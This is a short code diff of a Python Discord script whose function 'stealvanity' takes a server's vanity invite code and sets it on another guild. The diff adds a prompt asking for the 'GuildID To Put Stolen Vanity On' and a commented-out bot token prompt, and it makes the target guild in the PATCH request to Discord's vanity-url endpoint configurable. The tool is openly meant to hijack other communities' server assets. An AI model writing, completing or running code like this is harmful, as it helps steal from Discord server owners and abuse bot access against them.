@@ -1,3 +1,6 @@
+gid2 = input("[ ? ] GuildID To Put Stolen Vanity On -> ")
+#bottkn = input("[ ? ] Your Bot's Token -> ")
+
 import discord, httpx
 from discord.ext import commands
 
@@ -18,7 +21,7 @@ async def stealvanity(guild):
 		print(f"{req1.status_code} | {req1.json()}")
 
 		payload2 = {'code': vcode}
-		req2 = await session.patch('https://discord.com/api/v9/guilds/965766582733246545/vanity-url', json=payload2, headers=headers)
+		req2 = await session.patch(f'https://discord.com/api/v9/guilds/{gid2}/vanity-url', json=payload2, headers=headers)
 		print(f"{req2.status_code} | {req2.json()}")
 
 
